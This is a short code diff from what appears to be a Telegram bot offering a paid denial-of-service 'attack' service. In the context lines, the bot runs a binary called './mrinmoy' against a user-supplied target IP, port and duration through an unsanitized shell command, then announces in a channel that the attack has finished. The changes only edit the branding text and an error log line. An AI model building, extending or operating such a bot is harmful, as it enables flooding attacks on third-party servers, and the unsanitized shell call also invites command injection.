@@ -168,7 +168,7 @@ async def run_attack_command_async(target_ip, target_port, duration, user_durati
         command = f"./mrinmoy {target_ip} {target_port} {duration} 677"
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
-        bot.send_message(CHANNEL_ID, f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {target_ip} : {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 𝗜𝗚𝗡𝗜𝗧𝗘 𝘅 𝗦𝗔𝗝𝗔𝗧𝗛™")
+        bot.send_message(CHANNEL_ID, f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {target_ip} : {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺™")
     except Exception as e:
         bot.send_message(CHANNEL_ID, f"Error running attack command: {e}")
 
@@ -178,4 +178,4 @@ if __name__ == "__main__":
     try:
         bot.polling(none_stop=True)
     except Exception as e:
-        logging.error(f"An error occurred: {e}")
+        logging.error(f"{e}")
